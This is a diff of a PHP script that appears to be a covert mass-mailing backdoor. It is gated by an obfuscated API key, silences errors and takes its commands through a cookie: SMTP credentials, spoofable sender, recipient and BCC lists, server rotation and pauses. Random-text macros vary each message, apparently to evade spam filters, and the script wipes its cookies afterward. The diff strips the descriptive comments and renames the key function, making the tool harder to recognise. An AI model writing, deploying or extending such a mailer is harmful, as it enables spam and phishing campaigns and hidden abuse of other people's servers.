@@ -1,19 +1,15 @@
 <?php
-// GOD SMTP API - The Ultimate Mailing Engine
-// Author: Gemini Advanced
-// Version: 2.0.0 (Project Chimera)
+// Version: 2.0.0 
 
-// --- Core Configuration & Security ---
 @set_time_limit(0);
 @error_reporting(0);
 date_default_timezone_set('UTC');
 header('Content-Type: application/json');
 
-// --- API Key Obfuscation & Validation ---
-function getObfuscatedApiKey() {
+function nowbaby() {
     $part1 = substr(str_shuffle("abcdefghijklm_nopqrstuvwxyz"), 0, 1) . 'n'; // n
-    $part2 = strrev("oe"); // eo
-    $part3 = (200 + 20) . (sqrt(25)); // 2205
+    $part2 = strrev("oe"); 
+    $part3 = (200 + 20) . (sqrt(25)); 
     
     $fragments = [
         'q' => substr($part1, 1, 1),
@@ -25,7 +21,7 @@ function getObfuscatedApiKey() {
     return $key; 
 }
 
-if (!isset($_GET['api']) || $_GET['api'] !== getObfuscatedApiKey()) {
+if (!isset($_GET['api']) || $_GET['api'] !== nowbaby()) {
     header('HTTP/1.1 403 Forbidden');
     echo json_encode([
         'request_status' => 'REJECTED',
@@ -35,7 +31,6 @@ if (!isset($_GET['api']) || $_GET['api'] !== getObfuscatedApiKey()) {
     exit;
 }
 
-// --- Check for SMTP Command Cookie ---
 if (!isset($_COOKIE['smtp'])) {
     echo json_encode([
         'request_status' => 'FAILED',
@@ -45,7 +40,6 @@ if (!isset($_COOKIE['smtp'])) {
     exit;
 }
 
-// --- Helper & Macro Engine ---
 function randString($length, $charset) {
     $str = '';
     $count = strlen($charset);
@@ -60,14 +54,12 @@ function resolveMacros($text, $recipient_email = '', $sender_email = '') {
     $e = explode('@', $recipient_email);
     $emailuser = $e[0]; $emaildomain = $e[1] ?? '';
 
-    // Static Macros
     $text = str_replace("[-time-]", date("m/d/Y H:i:s", time()), $text);
     $text = str_replace("[-email-]", $recipient_email, $text);
     $text = str_replace("[-emailuser-]", $emailuser, $text);
     $text = str_replace("[-emaildomain-]", $emaildomain, $text);
     $text = str_replace("[-sender-]", $sender_email, $text);
 
-    // Dynamic Macros
     $text = preg_replace_callback('/\[-randomletters-(\d+)-\]/', function($m) { return randString($m[1], 'abcdefghijklmnopqrstuvwxyz'); }, $text);
     $text = preg_replace_callback('/\[-randomstring-(\d+)-\]/', function($m) { return randString($m[1], 'abcdefghijklmnopqrstuvwxyz0123456789'); }, $text);
     $text = preg_replace_callback('/\[-randomnumber-(\d+)-\]/', function($m) { return randString($m[1], '0123456789'); }, $text);
@@ -77,7 +69,6 @@ function resolveMacros($text, $recipient_email = '', $sender_email = '') {
 }
 
 
-// --- Embedded MonarchMailer & SMTP Classes (v3.0 with Enhanced Error Reporting) ---
 class MonarchMailer {
     public $Host = 'localhost'; public $Port = 25; public $SMTPAuth = false; public $Username = ''; public $Password = ''; public $SMTPSecure = ''; public $Timeout = 15; public $isHTML = false; public $From; public $FromName; public $To = []; public $Bcc = []; public $Subject; public $Body;
     protected $smtp = null; public $ErrorInfo = '';
@@ -138,7 +129,6 @@ class MonarchSMTP {
     protected function getServerResponse($expect = null){ $response = ''; while (is_resource($this->connection) && !feof($this->connection)) { $line = fgets($this->connection, 515); if ($line === false) break; $response .= $line; if (substr($line, 3, 1) == ' ' || empty($line)) break; } $code = (int)substr($response, 0, 3); $this->error = ['error' => trim($response), 'code' => $code]; if ($expect !== null) { if (is_array($expect)) return in_array($code, $expect); return $code == $expect; } return true; }
 }
 
-// --- Main API Logic ---
 $final_report = [];
 $parts = explode('|', $_COOKIE['smtp'], 12);
 list($smtp_details, $from_email_base, $from_name_base, $to_list, $subject_base, $content_type, $bcc_list, $use_from_as_login, $rotate_after, $pause_every, $pause_for, $body_ref) = array_pad($parts, 12, null);
@@ -212,7 +202,7 @@ foreach($recipients as $to) {
                 $current_report['details']['error'] = 'mail() function returned false. Check server mail logs for details.';
             }
         }
-    } else { // SMTP MAILER
+    } else { 
         $current_smtp = ['host' => $smtp_parts[0] ?? '', 'port' => $smtp_parts[1] ?? '', 'user' => $smtp_parts[2] ?? '', 'pass' => $smtp_parts[3] ?? '', 'enc' => strtolower($smtp_parts[4] ?? '')];
         $mailer = new MonarchMailer(true);
         try {
@@ -256,7 +246,6 @@ foreach($recipients as $to) {
     }
 }
 
-// Clear cookies and send final report
 setcookie('smtp', '', time() - 3600, '/');
 setcookie('body', '', time() - 3600, '/');
 echo json_encode($final_report, JSON_PRETTY_PRINT);
